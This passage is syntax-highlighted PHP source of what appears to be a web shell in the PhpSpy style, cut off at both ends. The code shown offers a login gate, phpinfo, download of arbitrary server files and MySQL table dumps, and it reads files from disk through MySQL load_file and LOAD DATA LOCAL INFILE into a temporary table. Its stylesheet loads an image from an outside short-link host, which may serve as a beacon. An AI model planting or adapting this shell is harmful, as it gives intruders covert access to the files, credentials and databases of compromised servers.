{\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">loginpage(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">loginpage(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n<span style=\"color: #999999; font-style: italic;\">\/*<\/span><span style=\"color: #999999; font-style: italic;\">===================== &#39564;&#35777;&#32467;&#26463; =====================*\/<\/span>\n\n$<span style=\"color: #ffcc66;\">errmsg<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n!$<span style=\"color: #ffcc66;\">action<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">action<\/span> = <span style=\"color: #66cccc;\">'file'<\/span>;\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#26597;&#30475;PHPINFO<\/span>\n<span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">action<\/span> == <span style=\"color: #66cccc;\">'phpinfo'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #f2777a; font-weight: bold;\">IS_PHPINFO<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">phpinfo(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">exit<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">errmsg<\/span> = <span style=\"color: #66cccc;\">'phpinfo() function has non-permissible'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#19979;&#36733;&#25991;&#20214;<\/span>\n<span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">doing<\/span> == <span style=\"color: #66cccc;\">'downfile'<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">thefile<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!@<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_exists(<\/span>$<span style=\"color: #ffcc66;\">thefile<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">errmsg<\/span> = <span style=\"color: #66cccc;\">'The file you want Downloadable was nonexistent'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fileinfo<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">pathinfo(<\/span>$<span style=\"color: #ffcc66;\">thefile<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">'Content-type: application\/x-'<\/span>.$<span style=\"color: #ffcc66;\">fileinfo<\/span>[<span style=\"color: #66cccc;\">'extension'<\/span>]);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">'Content-Disposition: attachment; filename='<\/span>.$<span style=\"color: #ffcc66;\">fileinfo<\/span>[<span style=\"color: #66cccc;\">'basename'<\/span><span style=\"text-decoration: underline;\">]);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">'Content-Length: '<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">filesize(<\/span>$<span style=\"color: #ffcc66;\">thefile<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   @<span style=\"color: #cccccc; background-color: #2d2d2d;\">readfile(<\/span>$<span style=\"color: #ffcc66;\">thefile<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">exit<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#30452;&#25509;&#19979;&#36733;&#22791;&#20221;&#25968;&#25454;&#24211;<\/span>\n<span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">doing<\/span> == <span style=\"color: #66cccc;\">'backupmysql'<\/span> &amp;&amp; !$<span style=\"color: #ffcc66;\">saveasfile<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!$<span style=\"color: #ffcc66;\">table<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">errmsg<\/span> =<span style=\"color: #66cccc;\">'Please choose the table'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mysqllink<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mydbconn(<\/span>$<span style=\"color: #ffcc66;\">dbhost<\/span>, $<span style=\"color: #ffcc66;\">dbuser<\/span>, $<span style=\"color: #ffcc66;\">dbpass<\/span>, $<span style=\"color: #ffcc66;\">dbname<\/span>, $<span style=\"color: #ffcc66;\">charset<\/span>, $<span style=\"color: #ffcc66;\">dbp<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">ort<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">filename<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">basename(<\/span>$<span style=\"color: #ffcc66;\">dbname<\/span>.<span style=\"color: #66cccc;\">'.sql'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">'Content-type: application\/unknown'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">'Content-Disposition: attachment; filename='<\/span>.$<span style=\"color: #ffcc66;\">filename<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">table<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">k<\/span> =&gt; $<span style=\"color: #ffcc66;\">v<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">v<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">sqldumptable(<\/span>$<span style=\"color: #ffcc66;\">v<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_close(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">exit<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n\n<span style=\"color: #999999; font-style: italic;\">\/\/ <\/span><span style=\"color: #999999; font-style: italic;\">&#36890;&#36807;MYSQL&#19979;&#36733;&#25991;&#20214;<\/span>\n<span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">doing<\/span>==<span style=\"color: #66cccc;\">'mysqldown'<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!$<span style=\"color: #ffcc66;\">dbname<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">errmsg<\/span> = <span style=\"color: #66cccc;\">'Please input dbname'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mysqllink<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mydbconn(<\/span>$<span style=\"color: #ffcc66;\">dbhost<\/span>, $<span style=\"color: #ffcc66;\">dbuser<\/span>, $<span style=\"color: #ffcc66;\">dbpass<\/span>, $<span style=\"color: #ffcc66;\">dbname<\/span>, $<span style=\"color: #ffcc66;\">charset<\/span>, $<span style=\"color: #ffcc66;\">dbp<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">ort<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!<span style=\"color: #cccccc; background-color: #2d2d2d;\">file_exists(<\/span>$<span style=\"color: #ffcc66;\">mysqldlfile<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">errmsg<\/span> = <span style=\"color: #66cccc;\">'The file you want Downloadable was nonexistent'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">result<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"select load_file('$mysqldlfile');\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(!$<span style=\"color: #ffcc66;\">result<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"DROP TABLE IF EXISTS tmp_angel;\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#29992;&#26102;&#38388;&#25139;&#26469;&#34920;&#31034;&#25130;&#26029;,&#36991;&#20813;&#20986;&#29616;&#35835;&#21462;&#33258;&#36523;&#25110;&#21253;&#21547;__angel_1111111111_eof__&#30340;&#25991;&#20214;&#26102;&#19981;&#23436;&#25972;&#30340;&#24773;&#20917;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"LOAD DATA LOCAL INFILE '\"<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">addslashes(<\/span>$<span style=\"color: #ffcc66;\">mysqldlfile<\/span>).<span style=\"color: #66cccc;\">\"' INTO TA<\/span><span style=\"color: #66cccc; text-decoration: underline;\">BLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">result<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"select content from tmp_angel\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"DROP TABLE tmp_angel\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">row<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_fetch_array(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!$<span style=\"color: #ffcc66;\">row<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">errmsg<\/span> = <span style=\"color: #66cccc;\">'Load file failed '<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_error(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fileinfo<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">pathinfo(<\/span>$<span style=\"color: #ffcc66;\">mysqldlfile<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">'Content-type: application\/x-'<\/span>.$<span style=\"color: #ffcc66;\">fileinfo<\/span>[<span style=\"color: #66cccc;\">'extension'<\/span>]);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">'Content-Disposition: attachment; filename='<\/span>.$<span style=\"color: #ffcc66;\">fileinfo<\/span>[<span style=\"color: #66cccc;\">'b<\/span><span style=\"color: #66cccc; text-decoration: underline;\">asename'<\/span><span style=\"text-decoration: underline;\">]);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">header(<\/span><span style=\"color: #66cccc;\">\"Accept-Length: \"<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">strlen(<\/span>$<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>]));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">echo<\/span> $<span style=\"color: #ffcc66;\">row<\/span>[<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">exit<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n\n<span style=\"color: #cc99cc;\">?&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;html&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;head&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;meta<\/span> <span style=\"color: #f2777a; font-weight: bold;\">http<\/span>-<span style=\"color: #f2777a; font-weight: bold;\">equiv<\/span>=<span style=\"color: #66cccc;\">\"Content-Type\"<\/span> <span style=\"color: #6699cc;\">content=<\/span><span style=\"color: #66cccc;\">\"text\/html; charset=gbk\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;title&gt;<\/span><span style=\"color: #cc99cc;\">&lt;?php<\/span> <span style=\"color: #99cc99;\">echo<\/span> $<span style=\"color: #ffcc66;\">action<\/span>.<span style=\"color: #66cccc;\">' - '<\/span>.$<span style=\"color: #6699cc;\">_SERVER<\/span>[<span style=\"color: #66cccc;\">'HTTP_HOST'<\/span>];<span style=\"color: #cc99cc;\">?&gt;<\/span><span style=\"color: #6699cc;\">&lt;\/title&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;style<\/span> <span style=\"color: #6699cc;\">type=<\/span><span style=\"color: #66cccc;\">\"text\/css\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"color: #f2777a; font-weight: bold;\">body<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">td<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">font<\/span>: <span style=\"color: #cccccc; background-color: #2d2d2d;\">12<\/span>px <span style=\"color: #f2777a; font-weight: bold;\">Arial<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">Tahoma<\/span>;<span style=\"color: #f2777a; font-weight: bold;\">line<\/span>-<span style=\"color: #f2777a; font-weight: bold;\">height<\/span>: <span style=\"color: #cccccc; background-color: #2d2d2d;\">16<\/span>px;}\n.<span style=\"color: #f2777a; font-weight: bold;\">input<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">font<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">12<\/span>px <span style=\"color: #f2777a; font-weight: bold;\">Arial<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">Tahoma<\/span>;<span style=\"color: #f2777a; font-weight: bold;\">background<\/span>:<span style=\"color: #999999; font-style: italic;\">#fff;border: 1px solid #666;padding:2px<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">;height:22px;}<\/span>\n.<span style=\"color: #f2777a; font-weight: bold;\">area<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">font<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">12<\/span>px <span style=\"color: #66cccc;\">'Courier New'<\/span>, <span style=\"color: #f2777a; font-weight: bold;\">Monospace<\/span>;<span style=\"color: #f2777a; font-weight: bold;\">background<\/span>:<span style=\"color: #999999; font-style: italic;\">#fff;border: 1px solid #666;<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">padding:2px;}<\/span>\n.<span style=\"color: #f2777a; font-weight: bold;\">bt<\/span> {<span style=\"color: #f2777a; font-weight: bold;\">border<\/span>-<span style=\"color: #f2777a; font-weight: bold;\">color<\/span>:<span style=\"color: #999999; font-style: italic;\">#b0b0b0;background:#3d3d3d url(http:\/\/t.cn\/zRymOgc);color:#fff<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">fff;font:12px Arial,Tahoma;height:22px;}<\/span>\n<span style=\"color: #f2777a; font-weight: bold;\">a<\/span> {<span style=\"color: #f2777a; font-weight: bold;\">color<\/span>: <span style=\"color: #999999; font-style: italic;\">#00f;text-decoration:underline;}<\/span>\n<span style=\"color: #f2777a; font-weight: bold;\">a<\/span>:<span style=\"color: #f2777a; font-weight: bold;\">hover<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">color<\/span>: <span style=\"color: #999999; font-style: italic;\">#f00;text-decoration:none;}<\/span>\n.<span style=\"color: #f2777a; font-weight: bold;\">alt1<\/span> <span style=\"color: #f2777a; font-weight: bold;\">td<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">border<\/span>-<span style=\"color: #f2777a; font-weight: bold;\">top<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>px <span style=\"color: #f2777a; font-weight: bold;\">solid<\/span> <span style=\"color: #999999; font-style: italic;\">#fff;border-bottom:1px solid #ddd;background:#f1f1<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">f1;padding:5px 15px 5px 5px;}<\/span>\n.<span style=\"color: #f2777a; font-weight: bold;\">alt2<\/span> <span style=\"color: #f2777a; font-weight: bold;\">td<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">border<\/span>-<span style=\"color: #f2777a; font-weight: bold;\">top<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>px <span style=\"color: #f2777a; font-weight: bold;\">solid<\/span> <span style=\"color: #999999; font-style: italic;\">#fff;border-bottom:1px solid #ddd;background:#f9f9<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">f9;padding:5px 15px 5px 5px;}<\/span>\n.<span style=\"color: #f2777a; font-weight: bold;\">focus<\/span> <span style=\"color: #f2777a; font-weight: bold;\">td<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">border<\/span>-<span style=\"color: #f2777a; font-weight: bold;\">top<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>px <span style=\"color: #f2777a; font-weight: bold;\">solid<\/span> <span style=\"color: #999999; font-style: italic;\">#fff;border-bottom:1px solid #ddd;background:#fff<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">faa;padding:5px 15px 5px 5px;}<\/span>\n.<span style=\"color: #f2777a; font-weight: bold;\">head<\/span> <span style=\"color: #f2777a; font-weight: bold;\">td<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">border<\/span>-<span style=\"color: #f2777a; font-weight: bold;\">top<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>px <span style=\"color: #f2777a; font-weight: bold;\">solid<\/span> <span style=\"color: #999999; font-style: italic;\">#fff;border-bottom:1px solid #ddd;background:#e9e9<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">e9;padding:5px 15px 5px 5px;font-weight:bold;}<\/span>\n.<span style=\"color: #f2777a; font-weight: bold;\">head<\/span> <span style=\"color: #f2777a; font-weight: bold;\">td<\/span> <span style=\"color: #f2777a; font-weight: bold;\">span<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">font<\/span>-<span style=\"color: #f2777a; font-weight: bold;\">weight<\/span>:<span style=\"color: #f2777a; font-weight: bold;\">normal<\/span>;}\n.<span style=\"color: #f2777a; font-weight: bold;\">infolist<\/span> {<span style=\"color: #f2777a; font-weight: bold;\">padding<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">10<\/span>px;<span style=\"color: #f2777a; font-weight: bold;\">margin<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">10<\/span>px <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">20<\/span>px <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;<span style=\"color: #f2777a; font-weight: bold;\">background<\/span>:<span style=\"color: #999999; font-style: italic;\">#F1F1F1;border:1px solid<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\"> #ddd;}<\/span>\n<span style=\"color: #f2777a; font-weight: bold;\">form<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">margin<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;<span style=\"color: #f2777a; font-weight: bold;\">padding<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;}\n<span style=\"color: #f2777a; font-weight: bold;\">h2<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">margin<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;<span style=\"color: #f2777a; font-weight: bold;\">padding<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;<span style=\"color: #f2777a; font-weight: bold;\">height<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">24<\/span>px;<span style=\"color: #f2777a; font-weight: bold;\">line<\/span>-<span style=\"color: #f2777a; font-weight: bold;\">height<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">24<\/span>px;<span style=\"color: #f2777a; font-weight: bold;\">font<\/span>-<span style=\"color: #f2777a; font-weight: bold;\">size<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">14<\/span>px;<span style=\"color: #f2777a; font-weight: bold;\">color<\/span>:<span style=\"color: #999999; font-style: italic;\">#5B686F;<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">}<\/span>\n<span style=\"color: #f2777a; font-weight: bold;\">ul<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">info<\/span> <span style=\"color: #f2777a; font-weight: bold;\">li<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">margin<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;<span style=\"color: #f2777a; font-weight: bold;\">color<\/span>:<span style=\"color: #999999; font-style: italic;\">#444;line-height:24px;height:24px;}<\/span>\n<span style=\"color: #f2777a; font-weight: bold;\">u<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">text<\/span>-<span style=\"color: #f2777a; font-weight: bold;\">decoration<\/span>: <span style=\"color: #f2777a; font-weight: bold;\">none<\/span>;<span style=\"color: #f2777a; font-weight: bold;\">color<\/span>:<span style=\"color: #999999; font-style: italic;\">#777;float:left;display:block;width:150px;margin-r<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">ight:10px;}<\/span>\n.<span style=\"color: #f2777a; font-weight: bold;\">drives<\/span>{<span style=\"color: #f2777a; font-weight: bold;\">padding<\/span>:<span style=\"color: #cccccc; background-color: #2d2d2d;\">5<\/span>px;}\n.<span style=\"color: #f2777a; font-weight: bold;\">drives<\/span> <span style=\"color: #f2777a; font-weight: bold;\">span<\/span> {<span style=\"color: #f2777a; font-weight: bold;\">margin<\/span>:<span style=\"color: #f2777a; font-weight: bold;\">auto<\/span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">7<\/span>px;}\n<span style=\"color: #6699cc;\">&lt;\/style&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;script<\/span> <span style=\"color: #6699cc;\">type=<\/span><span style=\"color: #66cccc;\">\"text\/javascript\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">CheckAll<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">form<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span>(<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #f2777a; font-weight: bold;\">i<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;<span style=\"color: #f2777a; font-weight: bold;\">i<\/span><span style=\"color: #6699cc;\">&lt;form<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">elements<\/span>.<span style=\"color: #f2777a; font-weight: 